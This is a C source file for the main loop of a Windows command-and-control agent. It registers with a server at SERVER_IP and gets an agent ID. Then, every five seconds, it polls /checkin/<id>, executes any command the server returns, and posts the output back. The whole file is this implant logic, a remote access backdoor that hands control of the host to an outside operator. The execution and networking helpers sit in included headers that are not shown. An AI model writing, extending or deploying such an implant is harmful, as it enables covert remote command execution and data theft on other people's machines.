#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include "../include/network.h"
#include "../include/commands.h"
#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    char agent_id[256] = {0};
    char response[BUFFER_SIZE];
    char output[BUFFER_SIZE] = {0};

    // Initialize Winsock once
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        fprintf(stderr, "WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }

    // Register agent
    printf("Attempting registration...\n");
    if (send_http_post(SERVER_IP, SERVER_PORT, "/register", NULL, response, sizeof(response)) == 0) {
        printf("Raw response:\n%s\n", response);  // Debug output

        char *body = extract_body(response);
        if (body) {
            strncpy(agent_id, body, sizeof(agent_id) - 1);
            agent_id[sizeof(agent_id)-1] = '\0';  // Ensure null-termination
            printf("Registered agent ID: %s\n", agent_id);
        } else {
            printf("No body in response\n");
        }
    } else {
        printf("Registration request failed\n");
    }

    if (strlen(agent_id) == 0) {
        fprintf(stderr, "Failed to register agent\n");
        WSACleanup();
        return 1;
    }

    // Main loop
    printf("Entering command loop...\n");
    while (1) {
        char path[256];
        snprintf(path, sizeof(path), "/checkin/%s", agent_id);

        if (send_http_post(SERVER_IP, SERVER_PORT, path, output, response, sizeof(response)) == 0) {
            char *command = extract_body(response);
            if (command && strlen(command) > 0) {
                printf("Executing: %s\n", command);
                execute_command(command, output, sizeof(output), agent_id);
            } else {
                output[0] = '\0';
            }
        } else {
            output[0] = '\0';
        }

        Sleep(5000);
    }

    WSACleanup();
    return EXIT_SUCCESS;
}